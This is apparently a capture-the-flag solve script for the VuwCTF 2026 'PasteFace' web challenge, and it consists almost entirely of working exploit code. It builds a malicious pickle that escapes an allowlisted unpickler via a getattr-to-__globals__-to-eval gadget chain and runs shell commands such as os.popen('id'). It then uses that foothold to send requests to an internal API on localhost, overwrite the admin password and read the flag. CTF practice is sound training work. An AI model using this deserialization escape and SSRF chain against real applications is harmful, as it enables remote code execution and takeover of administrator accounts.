#!/usr/bin/env python3
"""
PasteFace — VuwCTF 2026 (Web)

Full exploit chain:

  1. Escape the allowlist unpickler in `sandbox` using the one gadget it
     permits — builtins.getattr — to walk
         random.Random().shuffle.__globals__["__builtins__"]["eval"]
     giving arbitrary `eval` inside the sandbox container.
  2. Use the sandbox's own validation error as an output channel: any object
     that is not an iterable of ints/floats is echoed back inside
     "Data is expected to be an iterable of floats or ints, found {data}".
  3. Pivot over the internal network to the `db` REST API on localhost:9999,
     whose /users/<name>/password/ endpoint accepts PUT (the site never wires
     it up, but it is fully implemented). Set a known admin password.
  4. Log into the site as admin and read GET /admin/ for the flag.

Only dependency: requests.

    $ python3 solve.py [base_url]
"""

import argparse
import re
import struct
import sys
import html

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_URL = "https://paste-face-2a5a3ca32e32d46c.challenges.2026.vuwctf.com"
NEW_ADMIN_PASSWORD = "pwn12345"

# The site reads at most 1024 bytes for the model AND Flask caps the whole
# multipart request at MAX_CONTENT_LENGTH = 1024, so every payload has to fit
# inside that budget including multipart framing.
MAX_REQUEST = 1024


# --------------------------------------------------------------------------
# Minimal pickle assembler (protocol 5, no FRAME opcodes)
# --------------------------------------------------------------------------
def u(s: str) -> bytes:
    """SHORT_BINUNICODE / BINUNICODE."""
    e = s.encode()
    if len(e) < 256:
        return bytes([0x8C, len(e)]) + e
    return b"X" + struct.pack("<I", len(e)) + e  # NB: BINUNICODE, 4-byte length


def const(x) -> bytes:
    if isinstance(x, str):
        return u(x)
    if isinstance(x, bool):
        return b"\x88" if x else b"\x89"
    if isinstance(x, int):
        return bytes([0x4B, x]) if 0 <= x < 256 else b"J" + struct.pack("<i", x)
    if isinstance(x, bytes):
        if len(x) < 256:
            return bytes([0x43, len(x)]) + x
        return b"B" + struct.pack("<I", len(x)) + x
    if x is None:
        return b"N"
    if isinstance(x, tuple):
        return b"(" + b"".join(const(i) for i in x) + b"t"
    if isinstance(x, list):
        return b"]" + b"(" + b"".join(const(i) for i in x) + b"e"
    raise TypeError(x)


def G(mod: str, name: str) -> bytes:
    """STACK_GLOBAL — only reachable for names the allowlist permits."""
    return u(mod) + u(name) + b"\x93"


def CALL(func: bytes, *args: bytes) -> bytes:
    """REDUCE — unrestricted, it calls whatever callable is on the stack."""
    return func + b"(" + b"".join(args) + b"t" + b"R"


def build(expr: bytes) -> bytes:
    return b"\x80\x05" + expr + b"."


GETATTR = G("builtins", "getattr")          # allowed by the sandbox allowlist
RANDOM = CALL(G("random", "Random"))        # allowed: module "random"


def A(obj: bytes, name: str) -> bytes:
    """getattr(obj, name)"""
    return CALL(GETATTR, obj, const(name))


# random.Random().shuffle is a *Python* method, so it carries __globals__,
# which is the random module's dict, which contains __builtins__.
GLOBALS = A(A(RANDOM, "shuffle"), "__globals__")
BUILTINS = CALL(A(GLOBALS, "get"), const("__builtins__"))   # a dict here
EVAL = CALL(A(BUILTINS, "get"), const("eval"))


# --------------------------------------------------------------------------
# Transport
# --------------------------------------------------------------------------
class PasteFace:
    def __init__(self, base: str, verbose: bool = True):
        self.base = base.rstrip("/")
        self.verbose = verbose
        self.s = requests.Session()
        self.s.verify = False

    def _multipart(self, payload: bytes, name: str = "x") -> bytes:
        """Hand-rolled multipart body — keeps framing overhead minimal."""
        return (
            b"--b\r\n"
            b'Content-Disposition: form-data; name="name"\r\n\r\n'
            + name.encode()
            + b"\r\n--b\r\n"
            b'Content-Disposition: form-data; name="paste.model"; filename="m"\r\n'
            b"Content-Type: application/octet-stream\r\n\r\n"
            + payload
            + b"\r\n--b--\r\n"
        )

    def upload(self, payload: bytes, name: str = "x") -> str:
        """Upload a pickle and return the echoed test result / error text."""
        body = self._multipart(payload, name)
        if len(body) > MAX_REQUEST:
            raise SystemExit(
                "payload too large: %d byte request (limit %d) — shorten the code"
                % (len(body), MAX_REQUEST)
            )
        r = self.s.post(
            self.base + "/pastes/",
            data=body,
            headers={"Content-Type": "multipart/form-data; boundary=b"},
            timeout=60,
        )
        found = re.findall(r"<p>(Test (?:results|errors):.*?)</p>", r.text, re.S)
        out = html.unescape("\n".join(found)) if found else r.text[:400]
        if self.verbose:
            print("    [req %4d B] %s" % (len(body), out[:220].replace("\n", " ")))
        return out

    # -- remote primitives -------------------------------------------------
    def ev(self, code: str, name: str = "x") -> str:
        """eval(code) inside the sandbox container; result echoed back."""
        return self.upload(build(CALL(EVAL, const(code))), name)

    def request(self, url, method="GET", data=None, hdr=None, name="x") -> str:
        """Make an HTTP request from inside the sandbox (internal network)."""
        parts = "%r,method=%r" % (url, method)
        if data is not None:
            parts += ",data=%r" % data
        if hdr:
            parts += ",headers=%r" % hdr
        code = (
            "(lambda r:str(r.urlopen(r.Request(%s),timeout=8).read()))"
            "(__import__('urllib.request').request)" % parts
        )
        return self.ev(code, name)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("url", nargs="?", default=DEFAULT_URL)
    ap.add_argument("-p", "--password", default=NEW_ADMIN_PASSWORD)
    args = ap.parse_args()

    pf = PasteFace(args.url)

    print("[1] escaping the allowlist unpickler (getattr -> __globals__ -> eval)")
    if "found 1337" not in pf.ev("1337", "poc"):
        print("    !! no eval primitive — is the sandbox container up?")
        return 1
    print("    -> arbitrary eval in the sandbox container")

    print("[2] confirming code execution")
    pf.ev("__import__('os').popen('id').read().strip()", "id")

    print("[3] reaching the internal db API (localhost:9999)")
    pf.request("http://localhost:9999/", name="db")

    print("[4] overwriting the admin password via the unexposed PUT endpoint")
    body = ('{"password":"%s"}' % args.password).encode()
    res = pf.request(
        "http://localhost:9999/users/admin/password/",
        "PUT",
        body,
        {"Content-Type": "application/json"},
        name="pw",
    )
    if "Success" not in res:
        print("    !! password update did not report success")
        return 1

    print("[5] logging into the site as admin")
    s = requests.Session()
    s.verify = False
    r = s.post(
        args.url.rstrip("/") + "/users/login",
        data={"username": "admin", "password": args.password},
        timeout=30,
    )
    if "session" not in s.cookies.get_dict():
        print("    !! login failed:", r.status_code, r.text[:200])
        return 1
    print("    -> session cookie:", s.cookies.get_dict()["session"])

    print("[6] reading GET /admin/")
    r = s.get(args.url.rstrip("/") + "/admin/", timeout=30)
    m = re.search(r"VuwCTF\{[^}]*\}", r.text)
    print()
    print("FLAG:", m.group(0) if m else r.text[:300])
    return 0 if m else 1


if __name__ == "__main__":
    sys.exit(main())
